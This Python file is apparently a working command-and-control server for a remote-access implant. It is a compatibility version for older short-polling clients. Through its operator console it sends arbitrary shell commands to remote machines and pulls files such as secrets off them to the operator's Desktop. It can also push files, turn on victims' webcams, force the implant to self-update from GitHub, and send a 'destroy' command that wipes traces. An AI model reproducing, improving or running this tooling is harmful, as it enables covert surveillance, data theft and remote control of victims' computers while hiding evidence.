#!/usr/bin/env python3
"""
Shell C2 — compatibility server for old short-polling clients (pre-long-poll).

Use this to reach a client still running the old architecture (commit 0a32933
and earlier). The old client polls /cmd with a short HTTP timeout (~10s) and
expects an immediate response (empty string if nothing is pending). The current
server.py holds the connection for up to 30s which triggers a timeout + backoff
loop on the old client, making it effectively unreachable.

Workflow:
  1. Stop server.py
  2. python3 older.py
  3. Wait for old client to reconnect (~15-60s backoff)
  4. Send 'update' to push the client to v3.1.1
  5. Wait ~1-2 min for client to self-update and watchdog to relaunch
  6. Stop older.py
  7. python3 server.py   ← new client uses long-poll, fully compatible

Endpoints supported (old client uses all of these):
  GET  /cmd         – returns pending command immediately (no long-poll hold)
  GET  /signal      – returns pending cancel signal
  GET  /stdin       – returns pending stdin lines
  GET  /ping        – health check, returns "pong"
  GET  /fetch       – client fetches a file queued via 'put'
  POST /result      – client posts final command result
  POST /stream      – client posts live output chunk
  POST /interactive – client sets interactive session flag
  POST /upload      – client uploads a file to ~/Desktop
  POST /camera_frame – camera frame (passthrough, not displayed here)

Endpoints NOT included (new server.py only):
  /camera_snapshot, /camera_view, /camera_signal
"""

VERSION = "compat-old-client"
TOKEN = "81f7cc9dca3ded71456c89a83b8a5325fc7d9a345b76c7ac6eba8aa96fdd3782"  # must match server.py
ENFORCE_TOKEN = False           # old clients don't send token — let them through

from http.server import HTTPServer, BaseHTTPRequestHandler
from socketserver import ThreadingMixIn
from urllib.parse import urlparse, parse_qs
import socket
import threading
import sys
import time
import queue
import signal
import os
import readline  # enables arrow-key history in input()

# Per-client state
clients = {}
lock = threading.Lock()
active_client = None
result_queue = queue.Queue(maxsize=500)  # (client_id, kind, body)
pending_files = {}  # client_id -> (filename, bytes) waiting for client to fetch

# Hard cap on request body size (uploads). Prevents a bogus giant
# Content-Length from ballooning handler-thread memory.
MAX_BODY_BYTES = 256 * 1024 * 1024


def enqueue_result(client_id, kind, body):
    """Queue console output. Live 'stream' chunks are droppable under
    pressure; final 'result' payloads are never silently lost."""
    item = (client_id, kind, body)
    if kind != "result":
        try:
            result_queue.put_nowait(item)
        except queue.Full:
            pass
        return
    while True:
        try:
            result_queue.put_nowait(item)
            return
        except queue.Full:
            pass
        # Queue full: drain it, keep only the newest results (plus ours),
        # discard transient stream chunks, then re-fill.
        drained = []
        while True:
            try:
                drained.append(result_queue.get_nowait())
            except queue.Empty:
                break
        keep = [d for d in drained if d[1] == "result"][-(result_queue.maxsize - 1):]
        for kept in keep + [item]:
            try:
                result_queue.put_nowait(kept)
            except queue.Full:
                break
        return


# Silence longer than this before a reconnecting client's state is stale
# (mirrors server.py: an outage must not leave a session wedged as RUNNING).
STALE_STATE_AFTER = 120


def _reset_stale_state(client_id, client):
    """Clear wedged per-client state when a previously-offline client checks in.

    Without this, command_running=True from before an outage persists forever:
    the session shows RUNNING, refuses every new command, and effectively
    disappears from the operator's workflow. Must be called with the lock held
    and BEFORE refreshing last_checkin."""
    if (
        not client["command_running"]
        and not client["pending_stdin"]
        and not client["interactive"]
    ):
        return
    silent_for = time.time() - client["last_checkin"]
    if silent_for <= STALE_STATE_AFTER:
        return
    client["command_running"] = False
    client["interactive"] = False
    client["pending_stdin"] = []
    safe_print(
        f"[*] {client_id} back after {silent_for:.0f}s silence — cleared stale command state."
    )


def get_or_create_client(client_id):
    """Get or create a client entry. Must be called with lock held."""
    if client_id not in clients:
        clients[client_id] = {
            "last_checkin": 0,
            "pending_command": None,
            "pending_signal": None,
            "pending_stdin": [],
            "command_running": False,
            "interactive": False,
        }
    else:
        _reset_stale_state(client_id, clients[client_id])
    return clients[client_id]


def get_prompt():
    if active_client:
        client = clients.get(active_client)
        if client and client.get("interactive"):
            return f"{active_client} [interactive]> "
        return f"{active_client}> "
    return "shell> "

def safe_print(msg):
    """Print a status message without clobbering the readline input buffer.
    Saves the current partially-typed line, prints the message on its own
    line, then redraws the prompt + saved text so the user's input is intact."""
    buf = readline.get_line_buffer()
    prompt = get_prompt()
    sys.stdout.write(f"\r\033[K{msg}\n{prompt}{buf}")
    sys.stdout.flush()


def cancel_shortcut(signum, frame):
    """Handle Ctrl+\\ to cancel the running remote command on the active client."""
    with lock:
        if not active_client:
            safe_print("[*] No active client. Use 'use <id>' to select one.")
            return
        client = clients.get(active_client)
        if client and (client["command_running"] or client["pending_command"]):
            client["pending_signal"] = "cancel"
            client["pending_command"] = None
            client["pending_stdin"] = []
            safe_print(f"[*] Cancel signal sent to {active_client} (Ctrl+\\).")
        else:
            safe_print(f"[*] No command running on {active_client}.")


signal.signal(signal.SIGQUIT, cancel_shortcut)


class DualStackHTTPServer(ThreadingMixIn, HTTPServer):
    """Listen on both IPv4 and IPv6 so cloudflared can connect via either."""

    daemon_threads = True
    address_family = socket.AF_INET6
    request_queue_size = 32

    def server_bind(self):
        if self.address_family == socket.AF_INET6:
            self.socket.setsockopt(socket.IPPROTO_IPV6, socket.IPV6_V6ONLY, 0)
        self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        super().server_bind()

    def handle_error(self, request, client_address):
        """Silence routine connection drops (dead clients, phone networks,
        cloudflared restarts) instead of dumping a traceback per request."""
        exc = sys.exc_info()[1]
        if isinstance(exc, (BrokenPipeError, ConnectionResetError, TimeoutError, socket.timeout)):
            return
        sys.stderr.write(f"[!] Handler error from {client_address}: {exc!r}\n")


class Handler(BaseHTTPRequestHandler):
    def log_message(self, format, *args):
        pass

    protocol_version = "HTTP/1.1"
    # Per-socket timeout: reaps handler threads stuck on half-dead
    # connections. Short-poll answers immediately, so this only bounds
    # dead-socket reads/writes.
    timeout = 65

    def _parse_client_id(self):
        """Extract client ID from ?id= query parameter."""
        parsed = urlparse(self.path)
        params = parse_qs(parsed.query)
        ids = params.get("id", [])
        return ids[0] if ids else None

    def _check_token(self):
        if not ENFORCE_TOKEN:
            return True
        provided = (
            self.headers.get("X-Token", "")
            or parse_qs(urlparse(self.path).query).get("token", [""])[0]
        )
        return provided == TOKEN

    def _respond(self, code, body=b""):
        """Helper to send a response with proper headers."""
        self.send_response(code)
        self.send_header("Content-Type", "text/plain")
        self.send_header("Content-Length", str(len(body)))
        self.send_header("Connection", "close")
        self.end_headers()
        self.wfile.write(body)

    def do_GET(self):
        parsed = urlparse(self.path)
        path = parsed.path
        client_id = self._parse_client_id()

        if not self._check_token():
            self._respond(403, b"forbidden")
            return

        if path == "/cmd":
            if not client_id:
                self._respond(400, b"missing id")
                return
            # SHORT-POLL: return immediately. Empty string if no command pending.
            # The old client sleeps briefly between polls — no 30s hold here.
            with lock:
                client = get_or_create_client(client_id)
                client["last_checkin"] = time.time()
                cmd = client["pending_command"] or ""
                if cmd:
                    client["pending_command"] = None
            self._respond(200, cmd.encode())

        elif path == "/signal":
            if not client_id:
                self._respond(200, b"")
                return
            with lock:
                client = get_or_create_client(client_id)
                client["last_checkin"] = time.time()
                sig = client["pending_signal"] or ""
                client["pending_signal"] = None
            self._respond(200, sig.encode())

        elif path == "/stdin":
            if not client_id:
                self._respond(200, b"")
                return
            with lock:
                client = get_or_create_client(client_id)
                client["last_checkin"] = time.time()
                lines = client["pending_stdin"]
                data = "\n".join(lines) if lines else ""
                client["pending_stdin"] = []
            self._respond(200, data.encode())

        elif path == "/ping":
            if client_id:
                with lock:
                    client = get_or_create_client(client_id)
                    client["last_checkin"] = time.time()
            self._respond(200, b"pong")

        elif path == "/fetch":
            if not client_id:
                self._respond(400, b"missing id")
                return
            with lock:
                entry = pending_files.pop(client_id, None)
            if entry:
                filename, data = entry
                self.send_response(200)
                self.send_header("Content-Type", "application/octet-stream")
                self.send_header(
                    "Content-Disposition", f'attachment; filename="{filename}"'
                )
                self.send_header("Content-Length", str(len(data)))
                self.end_headers()
                self.wfile.write(data)
            else:
                self._respond(204, b"")  # no file pending

        else:
            self._respond(404)

    def do_POST(self):
        parsed = urlparse(self.path)
        path = parsed.path
        client_id = self._parse_client_id()

        if not self._check_token():
            self._respond(403, b"forbidden")
            return

        try:
            length = int(self.headers.get("Content-Length", 0))
        except (TypeError, ValueError):
            self._respond(400, b"bad content-length")
            return
        if length < 0:
            self._respond(400, b"bad content-length")
            return
        if length > MAX_BODY_BYTES:
            self._respond(413, b"body too large")
            return
        raw_body_bytes = self.rfile.read(length)
        if len(raw_body_bytes) < length:
            self._respond(400, b"incomplete body")
            return
        body = raw_body_bytes.decode(errors="replace")

        if path == "/stream":
            if client_id:
                with lock:
                    client = get_or_create_client(client_id)
                    client["last_checkin"] = time.time()
            enqueue_result(client_id, "stream", body)
            self._respond(200, b"ok")

        elif path == "/result":
            if client_id:
                with lock:
                    client = get_or_create_client(client_id)
                    client["last_checkin"] = time.time()
                    client["command_running"] = False
                    client["interactive"] = False
                    client["pending_stdin"] = []
            # Never drop /result — enqueue_result evicts droppable stream
            # chunks under pressure and always keeps final payloads (the old
            # inline loop could silently discard the result when the queue
            # happened to drain between the failed put and its evict).
            enqueue_result(client_id, "result", body)
            self._respond(200, b"ok")

        elif path == "/interactive":
            if client_id:
                with lock:
                    client = get_or_create_client(client_id)
                    client["interactive"] = body.strip().lower() == "true"
            self._respond(200, b"ok")

        elif path == "/upload":
            if not client_id:
                self._respond(400, b"missing id")
                return
            parsed_path = urlparse(self.path)
            params = parse_qs(parsed_path.query)
            filename = params.get("filename", ["unknown_file"])[0]
            filename = os.path.basename(filename)
            if not filename or "/" in filename or "\\" in filename:
                self._respond(400, b"invalid filename")
                return
            with lock:
                client = get_or_create_client(client_id)
                client["last_checkin"] = time.time()
                client["command_running"] = False
                client["pending_stdin"] = []
            raw_bytes = raw_body_bytes
            desktop = os.path.expanduser("~/Desktop")
            dest = os.path.join(desktop, filename)
            try:
                with open(dest, "wb") as f:
                    f.write(raw_bytes)
                msg = f"[+] File saved to ~/Desktop/{filename} ({len(raw_bytes):,} bytes)\n"
            except Exception as e:
                msg = f"[!] Failed to save file: {e}\n"
            enqueue_result(client_id, "result", msg)
            self._respond(200, b"ok")

        elif path == "/camera_frame":
            # Accept frames so the client doesn't error — we just discard them.
            # Camera viewing requires server.py (newer client).
            if not client_id:
                self._respond(400, b"missing id")
                return
            with lock:
                client = get_or_create_client(client_id)
                client["last_checkin"] = time.time()
            self._respond(200, b"ok")

        else:
            self._respond(404)


def result_printer():
    """Drain the result queue and print output cleanly."""
    while True:
        try:
            client_id, kind, body = result_queue.get(timeout=0.5)
            if body:
                with lock:
                    multi = len(clients) > 1
                    is_interactive = (
                        clients.get(client_id, {}).get("interactive", False)
                        if client_id
                        else False
                    )
                tag = f"[{client_id}] " if (multi and client_id) else ""
                sys.stdout.write(f"\r\033[K{tag}{body}")
                if kind == "stream" and is_interactive:
                    sys.stdout.write(get_prompt())
            if kind == "result":
                sys.stdout.write(get_prompt())
            sys.stdout.flush()
        except queue.Empty:
            pass


def _resolve_client(target):
    """Resolve a target string to a client ID. Must be called with lock held.
    Supports: index number, exact match, or case-insensitive partial match."""
    try:
        idx = int(target) - 1
        client_list = list(clients.keys())
        if 0 <= idx < len(client_list):
            return client_list[idx]
    except ValueError:
        pass
    if target in clients:
        return target
    for cid in clients:
        if target.lower() in cid.lower():
            return cid
    return None


def input_loop():
    global active_client
    while True:
        try:
            cmd = input(get_prompt())
            if not cmd.strip():
                continue
        except (EOFError, KeyboardInterrupt):
            print("\n[*] Exiting.")
            os._exit(0)

        stripped = cmd.strip().lower()

        BUILTINS = {
            "cancel",
            "sessions",
            "status",
            "help",
            "exit",
            "stream",
            "stopstream",
            # Registered so `destroy` is intercepted even while a command is
            # running — otherwise it leaks into the remote process's stdin.
            "destroy",
        }
        BUILTIN_PREFIXES = ("use ", "kill ", "remove ", "get ", "put ")
        is_builtin = stripped in BUILTINS or any(
            stripped.startswith(p) for p in BUILTIN_PREFIXES
        )

        if stripped == "cancel":
            with lock:
                if not active_client:
                    print("[*] No active client. Use 'use <id>' to select one.")
                    continue
                client = clients.get(active_client)
                if client and (client["command_running"] or client["pending_command"]):
                    client["pending_signal"] = "cancel"
                    client["pending_command"] = None
                    client["pending_stdin"] = []
                    print(f"[*] Cancel signal queued for {active_client}.")
                else:
                    print(f"[*] No command running on {active_client}.")
            continue

        # While a command is running, forward non-builtin input as stdin.
        if not is_builtin:
            with lock:
                active_state = clients.get(active_client) if active_client else None
                if active_state and active_state["command_running"]:
                    active_state["pending_stdin"].append(cmd)
                    continue

        if stripped == "sessions":
            with lock:
                if not clients:
                    print("[*] No clients have connected yet.")
                else:
                    print(f"[*] {len(clients)} client(s):")
                    for i, (cid, state) in enumerate(clients.items(), 1):
                        elapsed = (
                            time.time() - state["last_checkin"]
                            if state["last_checkin"] > 0
                            else -1
                        )
                        if elapsed < 0:
                            status = "NEVER SEEN"
                        elif elapsed < 45:
                            mode = "RUNNING" if state["command_running"] else "IDLE"
                            status = f"ONLINE ({mode}) — {elapsed:.1f}s ago"
                        else:
                            status = f"OFFLINE — {elapsed:.0f}s ago"
                        marker = " ←" if cid == active_client else ""
                        print(f"  [{i}] {cid:20s}  {status}{marker}")
            continue

        if stripped.startswith("use "):
            target = cmd.strip()[4:].strip()
            if not target:
                print("[*] Usage: use <client-id or number>")
                continue
            with lock:
                match = _resolve_client(target)
                if match:
                    active_client = match
                    print(f"[*] Active target: {active_client}")
                else:
                    print(
                        f"[!] No client matching '{target}'. Type 'sessions' to list clients."
                    )
            continue

        if stripped == "status":
            with lock:
                if not active_client:
                    print("[*] No active client. Use 'use <id>' to select one.")
                    continue
                client = clients.get(active_client)
                if not client:
                    print(f"[!] Client {active_client} not found.")
                    continue
                elapsed = (
                    time.time() - client["last_checkin"]
                    if client["last_checkin"] > 0
                    else -1
                )
                is_running = client["command_running"]
            if elapsed < 0:
                print(f"[*] {active_client}: No check-in yet.")
            elif elapsed < 45:
                state = "RUNNING command" if is_running else "IDLE"
                print(
                    f"[*] {active_client}: ONLINE ({state}) — last check-in {elapsed:.1f}s ago"
                )
            else:
                print(
                    f"[!] {active_client}: may be OFFLINE — last check-in {elapsed:.0f}s ago"
                )
            continue

        if stripped.startswith("kill "):
            target = cmd.strip()[5:].strip()
            if not target:
                print("[*] Usage: kill <client-id or number>")
                continue
            with lock:
                match = _resolve_client(target)
                if match:
                    clients[match]["pending_command"] = "exit"
                    clients[match]["pending_stdin"] = []
                    print(f"[*] Exit command sent to {match}.")
                    if active_client == match:
                        active_client = None
                        print("[*] Active target cleared.")
                else:
                    print(f"[!] No client matching '{target}'.")
            continue

        if stripped.startswith("destroy ") or stripped == "destroy":
            target = cmd.strip()[8:].strip() if stripped.startswith("destroy ") else ""
            with lock:
                if not target:
                    if not active_client:
                        print("[*] No active client. Use 'use <id>' or 'destroy <id>'.")
                        continue
                    target = active_client
                match = _resolve_client(target)
                if match:
                    clients[match]["pending_command"] = "destroy"
                    clients[match]["pending_stdin"] = []
                    print(f"[*] Destroy command sent to {match}.")
                    print("[*] Client will wipe all traces and self-terminate.")
                    if active_client == match:
                        active_client = None
                        print("[*] Active target cleared.")
                else:
                    print(f"[!] No client matching '{target}'.")
            continue

        if stripped.startswith("remove "):
            target = cmd.strip()[7:].strip()
            if not target:
                print("[*] Usage: remove <client-id or number>")
                continue
            with lock:
                match = _resolve_client(target)
                if match:
                    del clients[match]
                    pending_files.pop(match, None)
                    print(f"[*] Removed {match} from sessions.")
                    if active_client == match:
                        active_client = None
                        print("[*] Active target cleared.")
                else:
                    print(f"[!] No client matching '{target}'.")
            continue

        if stripped == "help":
            print("╔═══════════════════════════════════════════════════╗")
            print("║  Shell C2 — Compatibility Server (older.py)       ║")
            print("╚═══════════════════════════════════════════════════╝")
            print()
            print("  This server speaks the OLD short-poll protocol.")
            print("  Use it to reach a client running pre-long-poll code,")
            print("  send 'update', then switch back to server.py.")
            print()
            print("  SESSION MANAGEMENT:")
            print("    sessions          List all connected clients")
            print("    use <id>          Switch active target (name or #)")
            print("    status            Check if active client is online")
            print("    kill <id>         Send exit to client (removes it)")
            print("    remove <id>       Remove stale client from list")
            print()
            print("  COMMAND CONTROL:")
            print("    cancel            Abort running command on active client")
            print("    Ctrl+\\            Same as cancel (keyboard shortcut)")
            print()
            print("  REMOTE COMMANDS (sent to old client):")
            print("    update            Force self-update from GitHub now  ← USE THIS")
            print("    get <filepath>    Download file from client to ~/Desktop")
            print("    put <filepath>    Upload local file to client's script dir")
            print("    stream            Start webcam streaming on client")
            print("    stopstream        Stop webcam streaming")
            print("    version           Show client version, host, PID")
            print()
            print("  SERVER:")
            print("    exit              Shut down THIS server (not client)")
            print("    help              Show this message")
            print()
            print("  WORKFLOW:")
            print("    1. Wait for old client to connect (check 'sessions')")
            print("    2. use <id>   — select the client")
            print("    3. update     — trigger self-update to v3.1.1")
            print("    4. Wait 1-2 min for watchdog to relaunch updated client")
            print("    5. exit       — stop older.py")
            print("    6. python3 server.py   — back to normal long-poll server")
            print()
            print(
                "  ⚠  'exit' shuts THIS SERVER only. Use 'kill <id>' to stop a client."
            )
            continue

        if stripped == "exit":
            print("[*] Shutting down server.")
            os._exit(0)

        # stream / stopstream — pass through as raw commands (old client handles them)
        if stripped in ("stream", "stopstream"):
            with lock:
                if not active_client:
                    print("[*] No active client. Use 'use <id>' to select one.")
                    continue
                client = clients.get(active_client)
                if not client:
                    print(f"[!] Client {active_client} not found.")
                    continue
                if client["command_running"]:
                    print(
                        f"[!] Command already running on {active_client}. Cancel first."
                    )
                    continue
                client["pending_stdin"] = []
                client["pending_command"] = stripped
                client["command_running"] = True
            print(f"[*] '{stripped}' queued for {active_client}.")
            continue

        if stripped.startswith("get "):
            filename = cmd.strip()[4:].strip()
            if not filename:
                print(
                    "[*] Usage: get <filepath>  (e.g. get C:\\Users\\user\\secret.txt)"
                )
                continue
            with lock:
                if not active_client:
                    print("[*] No active client. Use 'use <id>' to select one.")
                    continue
                client = clients.get(active_client)
                if not client:
                    print(f"[!] Client {active_client} not found.")
                    continue
                if client["command_running"]:
                    print(
                        f"[!] Command already running on {active_client}. Cancel first."
                    )
                    continue
                client["pending_stdin"] = []
                client["pending_command"] = f"get:{filename}"
                client["command_running"] = True
            print(f"[*] Requesting '{filename}' from {active_client}...")
            continue

        if stripped.startswith("put "):
            localpath = cmd.strip()[4:].strip()
            if not localpath:
                print("[*] Usage: put <local-filepath>")
                continue
            localpath = os.path.expanduser(localpath)
            if not os.path.isabs(localpath):
                localpath = os.path.join(os.getcwd(), localpath)
            if not os.path.isfile(localpath):
                print(f"[!] Local file not found: {localpath}")
                continue
            # Read the file OUTSIDE the lock: a large/slow disk read must not
            # stall every request thread and the operator console.
            try:
                with open(localpath, "rb") as f:
                    data = f.read()
            except Exception as e:
                print(f"[!] Cannot read file: {e}")
                continue
            filename = os.path.basename(localpath)
            with lock:
                if not active_client:
                    print("[*] No active client. Use 'use <id>' to select one.")
                    continue
                client = clients.get(active_client)
                if not client:
                    print(f"[!] Client {active_client} not found.")
                    continue
                if client["command_running"]:
                    print(
                        f"[!] Command already running on {active_client}. Cancel first."
                    )
                    continue
                pending_files[active_client] = (filename, data)
                client["pending_stdin"] = []
                client["pending_command"] = f"put:{filename}"
                client["command_running"] = True
            print(
                f"[*] Pushing '{filename}' ({len(data):,} bytes) to {active_client}..."
            )
            continue

        # --- Remote command or stdin ---
        with lock:
            if not active_client:
                print("[*] No active client. Use 'use <id>' to select one.")
                continue
            client = clients.get(active_client)
            if not client:
                print(f"[!] Client {active_client} not found.")
                continue
            if client["command_running"]:
                client["pending_stdin"].append(cmd)
            else:
                if client["pending_command"]:
                    print(
                        f"[!] Previous command on {active_client} still pending — overwriting."
                    )
                client["pending_stdin"] = []
                client["pending_command"] = cmd
                client["command_running"] = True


def status_printer():
    shown_warnings = set()
    while True:
        time.sleep(10)
        alerts = []
        cleared = []
        with lock:
            for cid, state in clients.items():
                checkin = state["last_checkin"]
                if checkin > 0:
                    elapsed = time.time() - checkin
                    if elapsed > 45 and cid not in shown_warnings:
                        alerts.append((cid, elapsed))
                        shown_warnings.add(cid)
                    elif elapsed <= 45:
                        cleared.append(cid)
        for cid in cleared:
            shown_warnings.discard(cid)
        for cid, elapsed in alerts:
            safe_print(f"[!] {cid}: No check-in for {elapsed:.0f}s — may be offline")


if __name__ == "__main__":
    PORT = 4444
    server = DualStackHTTPServer(("::", PORT), Handler)
    print(f"[*] Shell C2 Compatibility Server ({VERSION})")
    print(f"[*] Listening on port {PORT} (IPv4 + IPv6)")
    print("[*] SHORT-POLL mode — compatible with pre-long-poll clients")
    print("[*] Waiting for old client to connect...")
    print("[*] Type 'help' for workflow instructions\n")

    threading.Thread(target=input_loop, daemon=True).start()
    threading.Thread(target=result_printer, daemon=True).start()
    threading.Thread(target=status_printer, daemon=True).start()

    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print("\n[*] Server stopped.")
